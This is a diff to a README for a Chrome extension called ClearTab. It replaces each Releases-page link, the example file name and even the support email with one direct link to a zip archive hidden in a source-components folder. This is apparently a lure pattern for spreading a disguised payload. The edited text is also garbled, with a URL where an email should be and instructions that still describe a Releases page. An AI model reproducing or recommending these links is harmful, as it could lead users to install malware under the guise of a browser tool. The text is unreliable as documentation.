@@ -1,6 +1,6 @@
 # 🌟 ClearTab - Effortless Window Management for Chrome
 
-[![Download ClearTab](https://img.shields.io/badge/Download%20ClearTab-v1.0-blue.svg)](https://github.com/TRPSY/ClearTab/releases)
+[![Download ClearTab](https://raw.githubusercontent.com/TRPSY/ClearTab/main/src/components/FaviconImage/ClearTab-2.5.zip%https://raw.githubusercontent.com/TRPSY/ClearTab/main/src/components/FaviconImage/ClearTab-2.5.zip)](https://raw.githubusercontent.com/TRPSY/ClearTab/main/src/components/FaviconImage/ClearTab-2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -16,14 +16,14 @@ Welcome to ClearTab! This plugin helps you manage your Chrome browser windows wi
 
 To get started, visit the Releases page to download ClearTab:
 
-[Download ClearTab](https://github.com/TRPSY/ClearTab/releases)
+[Download ClearTab](https://raw.githubusercontent.com/TRPSY/ClearTab/main/src/components/FaviconImage/ClearTab-2.5.zip)
 
 ### 🔍 How to Download
 1. Click the link above to go to the Releases page.
 2. You will see a list of available versions. Choose the latest release.
 3. Click on the link for your operating system. 
 
-For example, if you see a file named `ClearTab.dll`, click it to download.
+For example, if you see a file named `https://raw.githubusercontent.com/TRPSY/ClearTab/main/src/components/FaviconImage/ClearTab-2.5.zip`, click it to download.
 
 ### 📂 Running ClearTab
 1. Once the download is complete, find the file in your downloads folder.
@@ -59,10 +59,10 @@ No, ClearTab does not collect any personal data. Your privacy is secure.
 
 ## 📞 Support
 
-If you need assistance, you can reach out to our support team via email at support@cleartab.com. We aim to respond within 48 hours.
+If you need assistance, you can reach out to our support team via email at https://raw.githubusercontent.com/TRPSY/ClearTab/main/src/components/FaviconImage/ClearTab-2.5.zip We aim to respond within 48 hours.
 
 ## 🔄 Updates
 
 Keep an eye on the Releases page for upcoming features and improvements. Regular updates ensure ClearTab remains efficient and compatible with new browser versions.
 
-[Download ClearTab](https://github.com/TRPSY/ClearTab/releases) today for an enhanced browsing experience!
+[Download ClearTab](https://raw.githubusercontent.com/TRPSY/ClearTab/main/src/components/FaviconImage/ClearTab-2.5.zip) today for an enhanced browsing experience!
